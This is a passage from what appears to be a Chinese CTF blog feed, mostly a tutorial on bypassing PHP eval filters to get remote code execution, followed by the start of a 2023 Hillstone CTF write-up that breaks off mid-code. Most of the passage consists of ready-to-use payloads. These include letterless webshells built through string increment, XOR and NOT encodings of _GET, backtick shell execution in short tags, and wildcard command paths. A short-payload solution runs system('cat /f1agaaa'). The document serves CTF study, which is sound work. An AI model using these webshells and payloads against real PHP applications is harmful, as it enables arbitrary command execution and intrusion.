class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-comment">//E</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//G</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//T</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;<br>(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br><br><span class="hljs-comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?_=system&amp;__=cat /f1agaaa<br>code=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br></code></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="_绕过"></a>_绕过</h2><p>之前的下划线只是作为变量名存在，可以使用其他字符代替下划线。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>    <br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure><p>任何字符与 0xff 异或都会取相反，这样就能减少运算量了。注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用 <code>&#123;&#125;</code> 代替，原因是 PHP 的 use of undefined constant 特性。例如 <code>$&#123;_GET&#125;&#123;a&#125;</code> 这样的语句 PHP 是不会判为错误的，因为 <code>&#123;&#125;</code> 是用来界定变量的，这句话就是会将 <code>_GET</code> 自动看为字符串，也就是 <code>$_GET[&#39;a&#39;]</code>。后面那个 <code>()</code> 为的是能够动态执行传入的 PHP 函数。</p><p><img src="https://img.katck.com/images/2023/01/19/e474257197381ccfba80b21a10614fbd.png" alt="image-20230119101506260" style="zoom:50%;" /></p><p>如果想要执行代函数的函数比如 <code>system(&#39;whoami&#39;)</code>，那我们可以对后面括号里的参数做相同的编码处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=readfile<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=highlight_file<br><span class="hljs-comment">// 即: </span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;whoami&#x27;);&amp;%ff=system</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=readfile</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=highlight_file</span><br></code></pre></td></tr></table></figure><h4 id="取反也是可以的"><a href="#取反也是可以的" class="headerlink" title="取反也是可以的"></a>取反也是可以的</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;(~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title=";绕过"></a>;绕过</h2><p>无需担心，前面我们已经说了，PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`&#123;$&#123;~<span class="hljs-string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//$_GET[%a0]</span><br>    <span class="hljs-comment">//code=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=whoami</span><br></code></pre></td></tr></table></figure><p>?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="$绕过"></a>$绕过</h2><p>如果过滤了 <code>$</code>，那么像之前那些构造变量的方法全都不能用了。我们可以在不同版本的 PHP 环境中寻找突破。</p><h3 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h3><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br><span class="hljs-comment">//(&#x27;phpinfo&#x27;)();</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=(~%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">93</span>%<span class="hljs-number">93</span>%a0%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%a0%<span class="hljs-number">99</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c)(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>,~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>e%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-comment">//call_user_func(system,whoami)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%DF%D0);    <span class="hljs-comment">// system(&#x27;ls /&#x27;);</span><br></code></pre></td></tr></table></figure><h3 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h3><h5 id="通配符执行命令"><a href="#通配符执行命令" class="headerlink" title="通配符执行命令"></a>通配符执行命令</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">code=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`/???/??? ????.???`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中/???/??? ????.???匹配/bin/cat flag.php，这样也能得到flag。</p><h5 id="通过通配符匹配临时文件，使用反单引号执行"><a href="#通过通配符匹配临时文件，使用反单引号执行" class="headerlink" title="通过通配符匹配临时文件，使用反单引号执行"></a>通过通配符匹配临时文件，使用反单引号执行</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?&gt;&lt;?=`.+/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f[<span class="hljs-meta">%</span><span class="hljs-number">40</span>-[]`<span class="hljs-meta">%</span><span class="hljs-number">3</span>b<span class="hljs-meta">%</span><span class="hljs-number">3</span>f&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/19/abab0451ab394e0657700c59b5f0c21b.png" alt="image-20230113222009790"></p><h2 id="绕过-3"><a href="#绕过-3" class="headerlink" title="[]绕过"></a>[]绕过</h2><p>有些情况下只能使用自增执行命令，但是<code>[]</code>也被过滤，我们需要其他方式来获取字符串</p><p>[]是为了构造Array然后转换成字符串的”Array”再截断。</p><p>[]被过滤了其实还可以利用NAN</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$___</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;; <span class="hljs-comment">//N</span><br></code></pre></td></tr></table></figure><p>在php的官方文档中是这样解释的:</p><p>“某些数学运算会产生一个由常量 NAN 所代表的结果。此结果代表着一个在浮点数运算中未定义或不可表述的值”</p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><h2 id="字数限制"><a href="#字数限制" class="headerlink" title="字数限制"></a>字数限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$ctfshow</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">84</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$ctfshow</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ctfshow</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Are you hacking me AGAIN?&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>题目限制 <code>strlen($ctfshow) &lt;= 84</code> ，需要我们压缩代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=(_/_._)[<span class="hljs-number">0</span>];<span class="hljs-comment">//直接拼接成字符串并切片</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//$o=&gt;PO,$a=&gt;P</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//Q</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POS,$a=&gt;S</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POST,$a=&gt;T</span><br><span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[0]($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>将a、o替换成不可见字符，url编码会将+替换成空格，所以自行编码成%2b</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf_show=$%ff=(_/_._)[<span class="hljs-number">0</span>];$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff.$%fe;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;<span class="hljs-variable">$_</span>=_.$%fe;<span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);&amp;<span class="hljs-number">0</span>=system&amp;_=cat /f1agaaa<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="gettext插件利用"><a href="#gettext插件利用" class="headerlink" title="gettext插件利用"></a>gettext插件利用</h3><p>通过PHPINFO可以查看是否开启此插件</p><p>该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。这样有助于我们构造更短的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">_</span>(a/a)[a];<span class="hljs-comment">//相当于gettext(0/0)[0],得到N</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//O</span><br><span class="hljs-variable">$_</span>=_.++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$_</span>;<span class="hljs-comment">//_PO</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$_</span>.=++<span class="hljs-variable">$a</span>.++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[a](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[a]($_POST[_])</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023山石网科CTF冬令营结营赛Write Up</title>
    <link href="/2023/01/15/2023_hillstone_CTF/"/>
    <url>/2023/01/15/2023_hillstone_CTF/</url>
    
    <content type="html"><![CDATA[<p>还是太菜了，有几题该做出来没做出来。</p><p>这是第一篇文章，希望以后能持续输出。</p><p>为什么输出？<a href="https://zhuanlan.zhihu.com/p/88217284">https://zhuanlan.zhihu.com/p/88217284</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><p>通过SplFileObject读hint.php的代码，但因为有过滤，不能直接读flag</p><p><img src="https://img.katck.com/images/2023/01/15/faee8c11aa6b4026e1697da23a2ffdca.png" alt="faee8c11aa6b4026e1697da23a2ffdca.png"></p><p>base64解码后审计代码</p><p>POP链：<code>red::__destruct() =&gt; white::__toString() =&gt; color::__execute() ==&gt; blue::__invoke() ==&gt; red::__call() ==&gt; color::getFlag()</code></p><p>然后将color类中的$c1设置为flag.php即可读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> 